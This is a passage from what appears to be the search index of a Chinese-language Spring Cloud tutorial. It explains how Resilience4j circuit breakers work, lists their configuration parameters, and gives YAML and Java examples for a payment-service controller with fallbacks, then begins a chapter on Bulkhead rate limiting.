\u4f1a\u6253\u5f00\u3002\u8fd9\u4e2a\u53c2\u6570\u662f\u767d\u5206\u6bd4\uff0c\u6bd4\u5982 50 \u8868\u793a 50%\u3002 slidingWindowType\uff1a\u6ed1\u52a8\u7a97\u53e3\u7c7b\u578b\uff0c\u6709\u8ba1\u6570\u548c\u65f6\u95f4\u4e24\u79cd\u3002\u8ba1\u6570\u5373\u5728\u4e00\u5b9a\u6b21\u6570\u7684\u8bf7\u6c42\u4e2d\uff0c\u5931\u8d25\u7684\u6b21\u6570\u8d85\u8fc7\u4e00\u5b9a\u9608\u503c\uff0c\u5c31\u8ba4\u4e3a\u670d\u52a1\u51fa\u73b0\u95ee\u9898\uff1b\u65f6\u95f4\u5373\u5728\u4e00\u5b9a\u65f6\u95f4\u5185\uff0c\u8bf7\u6c42\u5931\u8d25\u7684\u6b21\u6570\u8d85\u8fc7\u4e00\u5b9a\u9608\u503c\uff0c\u5c31\u8ba4\u4e3a\u670d\u52a1\u51fa\u73b0\u95ee\u9898\u3002COUNT_BASED \u548c TIME_BASED\uff0c\u9ed8\u8ba4\u662f COUNT_BASED\u3002 slidingWindowSize\uff1a\u6ed1\u52a8\u7a97\u53e3\u5927\u5c0f\uff0c\u5982\u679c\u662f COUNT_BASED\uff0c\u8868\u793a\u5728\u591a\u5c11\u6b21\u8bf7\u6c42\u4e2d\u5224\u65ad\u670d\u52a1\u662f\u5426\u51fa\u73b0\u95ee\u9898\uff1b\u5982\u679c\u662f TIME_BASED\uff0c\u8868\u793a\u5728\u591a\u5c11\u65f6\u95f4\u5185\u5224\u65ad\u670d\u52a1\u662f\u5426\u51fa\u73b0\u95ee\u9898\u3002 permittedNumberOfCallsInHalfOpenState\uff1a\u534a\u5f00\u8def\u72b6\u6001\u4e0b\u5141\u8bb8\u901a\u8fc7\u7684\u8bf7\u6c42\u6570\u91cf\uff0c\u5982\u679c\u8d85\u8fc7\u8fd9\u4e2a\u6570\u91cf\uff0cCircuit Breaker \u4f1a\u8fdb\u5165\u5f00\u8def\u72b6\u6001\u3002\u9ed8\u8ba4\u662f 10\u3002 minimumNumberOfCalls\uff1a\u8ba1\u7b97\u9519\u8bef\u7387\u6216\u6162\u8c03\u7528\u7387\u7684\u6700\u5c0f\u8bf7\u6c42\u6570\u91cf\u3002\u4f8b\u5982\uff0c\u5982\u679c minimumNumberOfCalls \u4e3a 100\uff0c\u90a3\u4e48\u5728 100 \u4e2a\u8bf7\u6c42\u4e4b\u524d\uff0cCircuit Breaker \u4e0d\u4f1a\u8d77\u4efb\u4f55\u4f5c\u7528\u3002\u4e00\u822c\u548c\u7a97\u53e3\u5927\u5c0f\u4e00\u81f4\u3002 waitDurationInOpenState\uff1a\u5f00\u8def\u72b6\u6001\u4e0b\u7684\u7b49\u5f85\u65f6\u95f4\uff0c\u8d85\u8fc7\u8fd9\u4e2a\u65f6\u95f4\u540e\uff0cCircuit Breaker \u4f1a\u8fdb\u5165\u534a\u5f00\u8def\u72b6\u6001\u3002\u9ed8\u8ba4\u662f 60 \u79d2\u3002 \u5982\u679c\u4f7f\u7528 yaml \u914d\u7f6e\uff0c\u5c06\u9a7c\u5cf0\u547d\u540d\u6cd5\u6539\u6210 kebab-case \u5373\u53ef\uff0c\u6bd4\u5982 failureRateThreshold \u6539\u6210 failure-rate-threshold\u3002 \u5b9e\u73b0 \u9996\u5148\u5f15\u5165\u5305\u3002 implementation 'org.springframework.cloud:spring-cloud-starter-circuitbreaker-resilience4j:3.1.2' implementation 'org.springframework.boot:spring-boot-starter-aop' \u7136\u540e\u7528 application.yml \u521b\u5efa\u4e00\u4e2a Circuit Breaker\u3002 resilience4j: circuitbreaker: configs: default: sliding-window-type: COUNT_BASED sliding-window-size: 10 minimum-number-of-calls: 10 permitted-number-of-calls-in-half-open-state: 5 failure-rate-threshold: 50 wait-duration-in-open-state: 60s slow-call-rate-threshold: 50 slow-call-duration-threshold: 1000ms instances: payment-service: baseConfig: default sliding-window-size: 100 \u8fd9\u91cc\u7684 config \u662f\u521b\u5efa\u4e00\u7cfb\u5217\u7684\u914d\u7f6e\uff0c\u7136\u540e instance \u662f\u521b\u5efa\u4e00\u4e2a\u5b9e\u4f8b\u3002\u8fd9\u91cc\u7684 paymentAPI \u662f\u4e00\u4e2a\u5b9e\u4f8b\u7684\u540d\u5b57\uff0c\u53ef\u4ee5\u968f\u4fbf\u53d6\u3002 \u6216\u8005\u53ef\u4ee5\u7528 Java \u4ee3\u7801\u521b\u5efa\u3002 @Bean public CircuitBreakerConfigCustomizer externalServiceFooCircuitBreakerConfig() { return CircuitBreakerConfigCustomizer .of(\"externalServiceFoo\", builder -> builder.slidingWindowSize(10) .slidingWindowType(COUNT_BASED) .waitDurationInOpenState(Duration.ofSeconds(5)) .minimumNumberOfCalls(5) .failureRateThreshold(50.0f)); } \u7136\u540e\u5728\u4ee3\u7801\u4e2d\u4f7f\u7528\u3002 package io.github.fingerbone; import io.github.fingerbone.api.PaymentApi; import io.github.fingerbone.record.PaymentRecord; import io.github.fingerbone.wrapper.ResponseCode; import io.github.fingerbone.wrapper.ResponseWrapper; import io.github.resilience4j.circuitbreaker.annotation.CircuitBreaker; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.http.HttpEntity; import org.springframework.http.ResponseEntity; import org.springframework.web.bind.annotation.*; import org.springframework.web.client.RestTemplate; import org.springframework.core.ParameterizedTypeReference; import org.springframework.http.HttpMethod; import java.util.List; @RestController @RequestMapping(\"/if/payment\") public class ConsumerPaymentController { public ResponseWrapper<List<PaymentRecord>> fb(Throwable e) { return ResponseWrapper.error(ResponseCode.CIRCUIT_OPEN, null); } private final PaymentAPIIf paymentAPIIf; public ConsumerPaymentController(@Autowired PaymentAPIIf paymentAPIIf) { this.paymentAPIIf = paymentAPIIf; } @GetMapping @CircuitBreaker(name = \"bk\", fallbackMethod = \"fb\") public ResponseWrapper<List<PaymentRecord>> getAllPayments() { return paymentAPIIf.getAllPayments(); } @PostMapping public ResponseWrapper<PaymentRecord> createPayment(@RequestBody PaymentRecord paymentRecord) { return paymentAPIIf.createPayment(paymentRecord); } @GetMapping(\"/{id}\") public ResponseWrapper<PaymentRecord> getPayment(@PathVariable Long id) { return paymentAPIIf.getPayment(id); } @DeleteMapping(\"/{id}\") public ResponseWrapper<Void> deletePayment(@PathVariable Long id) { return paymentAPIIf.deletePayment(id); } @PutMapping(\"/{id}\") public ResponseWrapper<PaymentRecord> updatePayment(@PathVariable Long id, @RequestBody PaymentRecord paymentRecord) { return paymentAPIIf.updatePayment(id, paymentRecord); } } \u73b0\u5728\u6211\u4eec\u5c31\u4e3a GetAllPayments \u65b9\u6cd5\u6dfb\u52a0\u4e86 Circuit Breaker\uff0c\u5f53\u8bf7\u6c42\u5931\u8d25\u7387\u8d85\u8fc7 50% \u65f6\uff0cCircuit Breaker \u4f1a\u6253\u5f00\uff0c\u62d2\u7edd\u6240\u6709\u8bf7\u6c42\uff0c\u76f4\u5230 60 \u79d2\u540e\u8fdb\u5165\u534a\u5f00\u8def\u72b6\u6001\u3002 \u5982\u679c\u7ed9\u7c7b\u52a0\u8fd9\u4e2a\u6ce8\u89e3\uff0c\u90a3\u4e48\u7c7b\u4e2d\u6240\u6709\u7684\u516c\u5f00\u65b9\u6cd5\u90fd\u4f1a\u4f7f\u7528\u8fd9\u4e2a Circuit Breaker\u3002 \u6ce8\u89e3\u4e2d\uff0cname \u5c31\u662f\u524d\u9762\u914d\u7f6e\u7684 breaker \u540d\u79f0\uff0cfallbackMethod \u5c31\u662f\u5f53 Circuit Breaker \u6253\u5f00\u65f6\uff0c\u8c03\u7528\u7684\u65b9\u6cd5\u3002\u4f46\u662f\u8981\u6ce8\u610f\uff0cfallbackMethod \u7684\u51fd\u6570\u8fd4\u56de\u503c\u5fc5\u987b\u548c\u539f\u51fd\u6570\u4e00\u81f4\uff0c\u53c2\u6570\u53ef\u4ee5\u63a5\u53d7\u4e0e\u539f\u672c\u51fd\u6570\u4e00\u81f4\u7684\u53c2\u6570\uff0c\u53ef\u4ee5\u81ea\u5df1\u989d\u5916\u5e26\u4e00\u4e2a Throwable \u53c2\u6570\u3002 \u4e0b\u9762\u4f8b\u5982\u4e2d\uff0c\u8fd9\u4e9b Fallback \u90fd\u662f\u5408\u7406\u7684\uff0c @CircuitBreaker(name = \"BACKEND\", fallbackMethod = \"fallback\") public Mono<String> method(String param1) { return Mono.error(new NumberFormatException()); } private Mono<String> fallback(String param1, NumberFormatException e) { return Mono.just(\"Handled the NumberFormatException\"); } private Mono<String> fallback(String param1, Exception e) { return Mono.just(\"Handled any other exception\"); } private Mono<String> fallback(String param1) { return Mono.just(\"Handled the fallback\"); } private Mono<String> fallback(Throwable e) { return Mono.just(\"Handled the fallback\"); } \u5339\u914d\u65f6\uff0c\u6309\u7167\u8d8a\u8be6\u7ec6\uff0c\u8d8a\u4f18\u5148\u7684\u89c4\u5219\u3002Fallback \u65b9\u6cd5\u4e5f\u5141\u8bb8\u91cd\u8f7d\u3002\u4f46\u662f\u5339\u914d\u7684\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u5fc5\u987b\u548c\u539f\u65b9\u6cd5\u4e00\u81f4\u3002 \u5982\u679c\u4e0d\u5e26 Fallback Method\uff0c\u5219\u4f1a\u89e6\u53d1\u4e00\u4e2a\u5f02\u5e38\u3002\u56e0\u6b64\u4e5f\u53ef\u4ee5\u7528 adviser \u6765\u5904\u7406 fallback\u3002 package io.github.fingerbone.wrapper; import org.springframework.web.bind.annotation.ControllerAdvice; import org.springframework.web.bind.annotation.ExceptionHandler; import org.springframework.web.bind.annotation.RestControllerAdvice; @RestControllerAdvice public class ExceptionWrapper { @ExceptionHandler(RuntimeException.class) public ResponseWrapper<String> handleException(RuntimeException e) { return ResponseWrapper.error(ResponseCode.INTERNAL_SERVER_ERROR, e.getMessage()); } } \u4e0d\u8fc7\u8fd9\u4e2a\u65b9\u6cd5\u9897\u7c92\u5ea6\u6bd4\u8f83\u7c97\u3002 \u5982\u679c\u4f7f\u7528 OpenFeign\uff0c\u9700\u8981\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u52a0\u5165 spring: application: name: order-service cloud: openfeign: httpclient: hc5: enabled: true client: config: default: connect-timeout: 5000 read-timeout: 5000 logger-level: basic circuitbreaker: enabled: true \u5176\u5b83\u548c Interface Client \u4e00\u81f4\u3002","title":"Resilience4j \u670d\u52a1\u7194\u65ad\u548c\u964d\u7ea7"},{"location":"07/#spring-cloud-ch7-resilience4j","text":"Resilience4j \u662f\u5bf9 Circuit Breaker \u7684\u5b9e\u73b0\uff0c\u5b83\u63d0\u4f9b\u4e86\u66f4\u591a\u7684\u529f\u80fd\uff0c\u6bd4\u5982\u9650\u6d41\u3001\u91cd\u8bd5\u3001\u8d85\u65f6\u7b49\u3002Resilience4j \u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u7684\u7194\u65ad\u5e93\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5e38\u7528\u7684\u7194\u65ad\u5668\u5b9e\u73b0\uff0c\u6bd4\u5982 RateLimiter\u3001Retry\u3001Bulkhead\u3001CircuitBreaker \u7b49\u3002 \u53ef\u4ee5\u5c06 Circuit Breaker \u6bd4\u4f5c\u4e00\u4e2a\u4fdd\u9669\u4e1d\uff0c\u5f53\u670d\u52a1\u51fa\u73b0\u95ee\u9898\u65f6\uff0c\u4fdd\u9669\u4e1d\u4f1a\u65ad\u5f00\uff0c\u907f\u514d\u670d\u52a1\u96ea\u5d29\uff0c\u628a\u6545\u969c\u9650\u5236\u5728\u6700\u5c0f\u8303\u56f4\u5185\u3002 \u867d\u7136\u9898\u76ee\u53eb\u670d\u52a1\u7194\u65ad\u548c\u964d\u7ea7\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a Resilience4j \u63d0\u4f9b\u7684\u529f\u80fd\u8fdc\u4e0d\u6b62\u8fd9\u4e9b\uff0c\u5b83\u8fd8\u63d0\u4f9b\u4e86\u9650\u6d41\u3001\u91cd\u8bd5\u3001\u8d85\u65f6\u7b49\u529f\u80fd\u3002","title":"Spring Cloud \u901f\u6210 Ch7 Resilience4j \u670d\u52a1\u7194\u65ad\u548c\u964d\u7ea7"},{"location":"07/#_1","text":"Circuit Breaker \u7684\u539f\u7406\u662f\u901a\u8fc7\u72b6\u6001\u673a\u6765\u5b9e\u73b0\u7684\uff0c\u5b83\u6709\u4e09\u79cd\u72b6\u6001\uff1a\u95ed\u8def\uff0c\u5f00\u8def\uff0c\u534a\u5f00\u8def\uff0c\u7c7b\u6bd4\u7535\u8def\u7684\u5f00\u8def\u3001\u95ed\u8def\u3002 \u95ed\u8def\uff1a\u95ed\u8def\u5373\u6b63\u5e38\u72b6\u6001\uff0c\u670d\u52a1\u6b63\u5e38\uff0c\u8bf7\u6c42\u6b63\u5e38\u5904\u7406\u3002\u5982\u679c\u670d\u52a1\u51fa\u73b0\u95ee\u9898\uff0cCircuit Breaker \u4f1a\u8fdb\u5165\u5f00\u8def\u72b6\u6001\u3002 \u5f00\u8def\uff1a\u5f00\u8def\u72b6\u6001\u4e0b\uff0cCircuit Breaker \u4f1a\u62d2\u7edd\u6240\u6709\u8bf7\u6c42\uff0c\u76f4\u5230\u8d85\u65f6\u65f6\u95f4\u5230\u8fbe\u3002\u8d85\u65f6\u65f6\u95f4\u5230\u8fbe\u540e\uff0cCircuit Breaker \u4f1a\u8fdb\u5165\u534a\u5f00\u8def\u72b6\u6001\u3002 \u534a\u5f00\u8def\uff1a\u534a\u5f00\u8def\u72b6\u6001\u4e0b\uff0cCircuit Breaker \u4f1a\u5141\u8bb8\u4e00\u4e2a\u8bf7\u6c42\u901a\u8fc7\uff0c\u5982\u679c\u8bf7\u6c42\u6210\u529f\uff0cCircuit Breaker \u4f1a\u8fdb\u5165\u95ed\u8def\u72b6\u6001\uff0c\u5426\u5219\u4f1a\u7ee7\u7eed\u4fdd\u6301\u5f00\u8def\u72b6\u6001\u3002 \u5bf9\u4e8e\u670d\u52a1\u51fa\u73b0\u95ee\u9898\u7684\u6807\u51c6\uff0c\u53ef\u4ee5\u6309\u65f6\u95f4\u6ed1\u52a8\u7a97\u53e3\u6216\u8005\u8bf7\u6c42\u6b21\u6570\u6765\u5224\u65ad\u3002\u524d\u8005\u5373\u5728\u4e00\u5b9a\u65f6\u95f4\u5185\uff0c\u8bf7\u6c42\u5931\u8d25\u7684\u6b21\u6570\u8d85\u8fc7\u4e00\u5b9a\u9608\u503c\uff0c\u5c31\u8ba4\u4e3a\u670d\u52a1\u51fa\u73b0\u95ee\u9898\uff1b\u540e\u8005\u5373\u5728\u4e00\u5b9a\u6b21\u6570\u7684\u8bf7\u6c42\u4e2d\uff0c\u5931\u8d25\u7684\u6b21\u6570\u8d85\u8fc7\u4e00\u5b9a\u9608\u503c\uff0c\u5c31\u8ba4\u4e3a\u670d\u52a1\u51fa\u73b0\u95ee\u9898\u3002","title":"\u539f\u7406"},{"location":"07/#circuit-breaker","text":"","title":"\u670d\u52a1\u7194\u65ad\u4e0e\u964d\u7ea7 Circuit Breaker"},{"location":"07/#_2","text":"\u9996\u5148\u4ecb\u7ecd\u51e0\u4e2a\u91cd\u8981\u7684\u53c2\u6570\u3002\u5168\u90e8\u53c2\u6570\u53c2\u8003 \u6587\u6863 \u3002 failureRateThreshold\uff1a\u5931\u8d25\u7387\u9608\u503c\uff0c\u5f53\u8bf7\u6c42\u5931\u8d25\u7387\u8d85\u8fc7\u8fd9\u4e2a\u9608\u503c\u65f6\uff0cCircuit Breaker \u4f1a\u6253\u5f00\u3002\u8fd9\u4e2a\u53c2\u6570\u662f\u767d\u5206\u6bd4\uff0c\u6bd4\u5982 50 \u8868\u793a 50%\u3002 slowCallDurationThreshold\uff1a\u6162\u8c03\u7528\u6301\u7eed\u65f6\u95f4\u9608\u503c\uff0c\u5f53\u8bf7\u6c42\u7684\u6162\u8c03\u7528\u6301\u7eed\u65f6\u95f4\u8d85\u8fc7\u8fd9\u4e2a\u9608\u503c\u65f6\uff0c\u88ab\u89c6\u4e3a\u6162\u8c03\u7528\u3002\u8fd9\u4e2a\u53c2\u6570\u662f\u6beb\u79d2\uff0c\u6bd4\u5982 1000 \u8868\u793a 1 \u79d2\u3002 slowCallRateThreshold\uff1a\u6162\u8c03\u7528\u7387\u9608\u503c\uff0c\u5f53\u8bf7\u6c42\u7684\u6162\u8c03\u7528\u7387\u8d85\u8fc7\u8fd9\u4e2a\u9608\u503c\u65f6\uff0cCircuit Breaker \u4f1a\u6253\u5f00\u3002\u8fd9\u4e2a\u53c2\u6570\u662f\u767d\u5206\u6bd4\uff0c\u6bd4\u5982 50 \u8868\u793a 50%\u3002 slidingWindowType\uff1a\u6ed1\u52a8\u7a97\u53e3\u7c7b\u578b\uff0c\u6709\u8ba1\u6570\u548c\u65f6\u95f4\u4e24\u79cd\u3002\u8ba1\u6570\u5373\u5728\u4e00\u5b9a\u6b21\u6570\u7684\u8bf7\u6c42\u4e2d\uff0c\u5931\u8d25\u7684\u6b21\u6570\u8d85\u8fc7\u4e00\u5b9a\u9608\u503c\uff0c\u5c31\u8ba4\u4e3a\u670d\u52a1\u51fa\u73b0\u95ee\u9898\uff1b\u65f6\u95f4\u5373\u5728\u4e00\u5b9a\u65f6\u95f4\u5185\uff0c\u8bf7\u6c42\u5931\u8d25\u7684\u6b21\u6570\u8d85\u8fc7\u4e00\u5b9a\u9608\u503c\uff0c\u5c31\u8ba4\u4e3a\u670d\u52a1\u51fa\u73b0\u95ee\u9898\u3002COUNT_BASED \u548c TIME_BASED\uff0c\u9ed8\u8ba4\u662f COUNT_BASED\u3002 slidingWindowSize\uff1a\u6ed1\u52a8\u7a97\u53e3\u5927\u5c0f\uff0c\u5982\u679c\u662f COUNT_BASED\uff0c\u8868\u793a\u5728\u591a\u5c11\u6b21\u8bf7\u6c42\u4e2d\u5224\u65ad\u670d\u52a1\u662f\u5426\u51fa\u73b0\u95ee\u9898\uff1b\u5982\u679c\u662f TIME_BASED\uff0c\u8868\u793a\u5728\u591a\u5c11\u65f6\u95f4\u5185\u5224\u65ad\u670d\u52a1\u662f\u5426\u51fa\u73b0\u95ee\u9898\u3002 permittedNumberOfCallsInHalfOpenState\uff1a\u534a\u5f00\u8def\u72b6\u6001\u4e0b\u5141\u8bb8\u901a\u8fc7\u7684\u8bf7\u6c42\u6570\u91cf\uff0c\u5982\u679c\u8d85\u8fc7\u8fd9\u4e2a\u6570\u91cf\uff0cCircuit Breaker \u4f1a\u8fdb\u5165\u5f00\u8def\u72b6\u6001\u3002\u9ed8\u8ba4\u662f 10\u3002 minimumNumberOfCalls\uff1a\u8ba1\u7b97\u9519\u8bef\u7387\u6216\u6162\u8c03\u7528\u7387\u7684\u6700\u5c0f\u8bf7\u6c42\u6570\u91cf\u3002\u4f8b\u5982\uff0c\u5982\u679c minimumNumberOfCalls \u4e3a 100\uff0c\u90a3\u4e48\u5728 100 \u4e2a\u8bf7\u6c42\u4e4b\u524d\uff0cCircuit Breaker \u4e0d\u4f1a\u8d77\u4efb\u4f55\u4f5c\u7528\u3002\u4e00\u822c\u548c\u7a97\u53e3\u5927\u5c0f\u4e00\u81f4\u3002 waitDurationInOpenState\uff1a\u5f00\u8def\u72b6\u6001\u4e0b\u7684\u7b49\u5f85\u65f6\u95f4\uff0c\u8d85\u8fc7\u8fd9\u4e2a\u65f6\u95f4\u540e\uff0cCircuit Breaker \u4f1a\u8fdb\u5165\u534a\u5f00\u8def\u72b6\u6001\u3002\u9ed8\u8ba4\u662f 60 \u79d2\u3002 \u5982\u679c\u4f7f\u7528 yaml \u914d\u7f6e\uff0c\u5c06\u9a7c\u5cf0\u547d\u540d\u6cd5\u6539\u6210 kebab-case \u5373\u53ef\uff0c\u6bd4\u5982 failureRateThreshold \u6539\u6210 failure-rate-threshold\u3002","title":"\u914d\u7f6e\u53c2\u6570"},{"location":"07/#_3","text":"\u9996\u5148\u5f15\u5165\u5305\u3002 implementation 'org.springframework.cloud:spring-cloud-starter-circuitbreaker-resilience4j:3.1.2' implementation 'org.springframework.boot:spring-boot-starter-aop' \u7136\u540e\u7528 application.yml \u521b\u5efa\u4e00\u4e2a Circuit Breaker\u3002 resilience4j: circuitbreaker: configs: default: sliding-window-type: COUNT_BASED sliding-window-size: 10 minimum-number-of-calls: 10 permitted-number-of-calls-in-half-open-state: 5 failure-rate-threshold: 50 wait-duration-in-open-state: 60s slow-call-rate-threshold: 50 slow-call-duration-threshold: 1000ms instances: payment-service: baseConfig: default sliding-window-size: 100 \u8fd9\u91cc\u7684 config \u662f\u521b\u5efa\u4e00\u7cfb\u5217\u7684\u914d\u7f6e\uff0c\u7136\u540e instance \u662f\u521b\u5efa\u4e00\u4e2a\u5b9e\u4f8b\u3002\u8fd9\u91cc\u7684 paymentAPI \u662f\u4e00\u4e2a\u5b9e\u4f8b\u7684\u540d\u5b57\uff0c\u53ef\u4ee5\u968f\u4fbf\u53d6\u3002 \u6216\u8005\u53ef\u4ee5\u7528 Java \u4ee3\u7801\u521b\u5efa\u3002 @Bean public CircuitBreakerConfigCustomizer externalServiceFooCircuitBreakerConfig() { return CircuitBreakerConfigCustomizer .of(\"externalServiceFoo\", builder -> builder.slidingWindowSize(10) .slidingWindowType(COUNT_BASED) .waitDurationInOpenState(Duration.ofSeconds(5)) .minimumNumberOfCalls(5) .failureRateThreshold(50.0f)); } \u7136\u540e\u5728\u4ee3\u7801\u4e2d\u4f7f\u7528\u3002 package io.github.fingerbone; import io.github.fingerbone.api.PaymentApi; import io.github.fingerbone.record.PaymentRecord; import io.github.fingerbone.wrapper.ResponseCode; import io.github.fingerbone.wrapper.ResponseWrapper; import io.github.resilience4j.circuitbreaker.annotation.CircuitBreaker; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.http.HttpEntity; import org.springframework.http.ResponseEntity; import org.springframework.web.bind.annotation.*; import org.springframework.web.client.RestTemplate; import org.springframework.core.ParameterizedTypeReference; import org.springframework.http.HttpMethod; import java.util.List; @RestController @RequestMapping(\"/if/payment\") public class ConsumerPaymentController { public ResponseWrapper<List<PaymentRecord>> fb(Throwable e) { return ResponseWrapper.error(ResponseCode.CIRCUIT_OPEN, null); } private final PaymentAPIIf paymentAPIIf; public ConsumerPaymentController(@Autowired PaymentAPIIf paymentAPIIf) { this.paymentAPIIf = paymentAPIIf; } @GetMapping @CircuitBreaker(name = \"bk\", fallbackMethod = \"fb\") public ResponseWrapper<List<PaymentRecord>> getAllPayments() { return paymentAPIIf.getAllPayments(); } @PostMapping public ResponseWrapper<PaymentRecord> createPayment(@RequestBody PaymentRecord paymentRecord) { return paymentAPIIf.createPayment(paymentRecord); } @GetMapping(\"/{id}\") public ResponseWrapper<PaymentRecord> getPayment(@PathVariable Long id) { return paymentAPIIf.getPayment(id); } @DeleteMapping(\"/{id}\") public ResponseWrapper<Void> deletePayment(@PathVariable Long id) { return paymentAPIIf.deletePayment(id); } @PutMapping(\"/{id}\") public ResponseWrapper<PaymentRecord> updatePayment(@PathVariable Long id, @RequestBody PaymentRecord paymentRecord) { return paymentAPIIf.updatePayment(id, paymentRecord); } } \u73b0\u5728\u6211\u4eec\u5c31\u4e3a GetAllPayments \u65b9\u6cd5\u6dfb\u52a0\u4e86 Circuit Breaker\uff0c\u5f53\u8bf7\u6c42\u5931\u8d25\u7387\u8d85\u8fc7 50% \u65f6\uff0cCircuit Breaker \u4f1a\u6253\u5f00\uff0c\u62d2\u7edd\u6240\u6709\u8bf7\u6c42\uff0c\u76f4\u5230 60 \u79d2\u540e\u8fdb\u5165\u534a\u5f00\u8def\u72b6\u6001\u3002 \u5982\u679c\u7ed9\u7c7b\u52a0\u8fd9\u4e2a\u6ce8\u89e3\uff0c\u90a3\u4e48\u7c7b\u4e2d\u6240\u6709\u7684\u516c\u5f00\u65b9\u6cd5\u90fd\u4f1a\u4f7f\u7528\u8fd9\u4e2a Circuit Breaker\u3002 \u6ce8\u89e3\u4e2d\uff0cname \u5c31\u662f\u524d\u9762\u914d\u7f6e\u7684 breaker \u540d\u79f0\uff0cfallbackMethod \u5c31\u662f\u5f53 Circuit Breaker \u6253\u5f00\u65f6\uff0c\u8c03\u7528\u7684\u65b9\u6cd5\u3002\u4f46\u662f\u8981\u6ce8\u610f\uff0cfallbackMethod \u7684\u51fd\u6570\u8fd4\u56de\u503c\u5fc5\u987b\u548c\u539f\u51fd\u6570\u4e00\u81f4\uff0c\u53c2\u6570\u53ef\u4ee5\u63a5\u53d7\u4e0e\u539f\u672c\u51fd\u6570\u4e00\u81f4\u7684\u53c2\u6570\uff0c\u53ef\u4ee5\u81ea\u5df1\u989d\u5916\u5e26\u4e00\u4e2a Throwable \u53c2\u6570\u3002 \u4e0b\u9762\u4f8b\u5982\u4e2d\uff0c\u8fd9\u4e9b Fallback \u90fd\u662f\u5408\u7406\u7684\uff0c @CircuitBreaker(name = \"BACKEND\", fallbackMethod = \"fallback\") public Mono<String> method(String param1) { return Mono.error(new NumberFormatException()); } private Mono<String> fallback(String param1, NumberFormatException e) { return Mono.just(\"Handled the NumberFormatException\"); } private Mono<String> fallback(String param1, Exception e) { return Mono.just(\"Handled any other exception\"); } private Mono<String> fallback(String param1) { return Mono.just(\"Handled the fallback\"); } private Mono<String> fallback(Throwable e) { return Mono.just(\"Handled the fallback\"); } \u5339\u914d\u65f6\uff0c\u6309\u7167\u8d8a\u8be6\u7ec6\uff0c\u8d8a\u4f18\u5148\u7684\u89c4\u5219\u3002Fallback \u65b9\u6cd5\u4e5f\u5141\u8bb8\u91cd\u8f7d\u3002\u4f46\u662f\u5339\u914d\u7684\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u5fc5\u987b\u548c\u539f\u65b9\u6cd5\u4e00\u81f4\u3002 \u5982\u679c\u4e0d\u5e26 Fallback Method\uff0c\u5219\u4f1a\u89e6\u53d1\u4e00\u4e2a\u5f02\u5e38\u3002\u56e0\u6b64\u4e5f\u53ef\u4ee5\u7528 adviser \u6765\u5904\u7406 fallback\u3002 package io.github.fingerbone.wrapper; import org.springframework.web.bind.annotation.ControllerAdvice; import org.springframework.web.bind.annotation.ExceptionHandler; import org.springframework.web.bind.annotation.RestControllerAdvice; @RestControllerAdvice public class ExceptionWrapper { @ExceptionHandler(RuntimeException.class) public ResponseWrapper<String> handleException(RuntimeException e) { return ResponseWrapper.error(ResponseCode.INTERNAL_SERVER_ERROR, e.getMessage()); } } \u4e0d\u8fc7\u8fd9\u4e2a\u65b9\u6cd5\u9897\u7c92\u5ea6\u6bd4\u8f83\u7c97\u3002 \u5982\u679c\u4f7f\u7528 OpenFeign\uff0c\u9700\u8981\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u52a0\u5165 spring: application: name: order-service cloud: openfeign: httpclient: hc5: enabled: true client: config: default: connect-timeout: 5000 read-timeout: 5000 logger-level: basic circuitbreaker: enabled: true \u5176\u5b83\u548c Interface Client \u4e00\u81f4\u3002","title":"\u5b9e\u73b0"},{"location":"08/","text":"Spring Cloud \u901f\u6210 Ch8 Resilience4j Bulkhead, RateLimiter, TimeLimiter \u9650\u6d41 Bulkhead \u662f Resilience4j \u63d0\u4f9b\u7684\u9650\u6d41\u5668\uff0c\u5b83\u53ef\u4ee5\u9650\u5236\u5e76\u53d1\u8bf7\u6c42\u7684\u6570\u91cf\uff0c\u907f\u514d\u670d\u52a1\u88ab\u8fc7\u591a\u8bf7\u6c42\u62d6\u57ae\u3002Bulkhead \u6709\u4e24\u79cd\u6a21\u5f0f\uff1aSemaphore \u548c ThreadPool\u3002Semaphore \u662f\u901a\u8fc7\u4fe1\u53f7\u91cf\u6765\u9650\u5236\u5e76\u53d1\u8bf7\u6c42\u7684\u6570\u91cf\uff0cThreadPool \u662f\u901a\u8fc7\u7ebf\u7a0b\u6c60\u6765\u9650\u5236\u5e76\u53d1\u8bf7\u6c42\u7684\u6570\u91cf\u3002\u8fd9\u6837\u53ef\u4ee5\u9632\u6b62\u7531\u4e8e\u67d0\u4e00\u4e2a\u670d\u52a1\u7684\u54cd\u5e94\u65f6\u95f4\u8fc7\u957f\uff0c\u5bfc\u81f4\u7ebf\u7a0b\u6c60\u88ab\u5360\u6ee1\uff0c\u4ece\u800c\u5f71\u54cd\u5176\u4ed6\u670d\u52a1\u7684\u6b63\u5e38\u8fd0\u884c\u3002Bulkhead \u4e00\u8bcd\u539f\u610f\u5373\u8239\u8231\u9694\u677f\uff0c\u7528\u6765\u9632\u6b62\u8239\u8231\u5185\u7684\u6c34\u6cc4\u6f0f\u5230\u5176\u4ed6\u8239\u8231\u3002 \u4e0b\u9762\u6240\u6709\u7684\u8be6\u7ec6\u914d\u7f6e\u53ef\u67e5\u8be2 Resilience4j \u5b98\u65b9\u6587\u6863 Core Module \u90e8\u5206 \u3002 Bulkhead \u539f\u7406 Semaphore \u6a21\u5f0f\u4e2d\uff0c\u4f1a\u6709\u4e00\u4e2a\u4fe1\u53f7\u91cf\u6765\u9650\u5236\u5e76\u53d1\u8bf7\u6c42\u7684\u6570\u91cf\uff0c\u5f53\u8bf7\u6c42\u5230\u8fbe\u65f6\uff0c\u4f1a\u5148\u5c1d\u8bd5\u83b7\u53d6\u4fe1\u53f7\u91cf\uff0c\u5982\u679c\u83b7\u53d6\u6210\u529f\uff0c\u5219\u7ee7\u7eed\u6267\u884c\uff0c\u5426\u5219\u76f4\u63a5\u8fd4\u56de\u5931\u8d25\u3002\u7c7b\u6bd4\u4e8e\u9501\uff0cSemaphore 